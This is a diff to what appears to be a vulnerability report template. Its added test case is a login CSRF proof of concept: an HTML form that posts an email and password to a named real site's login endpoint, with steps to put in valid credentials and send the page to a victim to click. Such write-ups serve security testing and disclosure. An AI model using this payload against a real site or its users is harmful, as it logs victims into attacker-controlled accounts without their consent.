@@ -18,8 +18,20 @@
 ## Test Cases:
 
 ```
-1)
-2)
+1. Create a CSRF login POC using the following code.
+```
+<html>
+<body>
+<form action="https://unikrn.com/apiv1/login" method="POST">
+<input type="hidden" name="usr" value="[email]">
+<input type="hidden" name="pwd" value="[password]">
+<input type="submit" value="Submit request" />
+</form>
+</body>
+</html>
+```
+2. Replace the email and password with the valid credentials.
+3. Send the script to the victim to make them click.
 ```
 ## Example/POC :
 
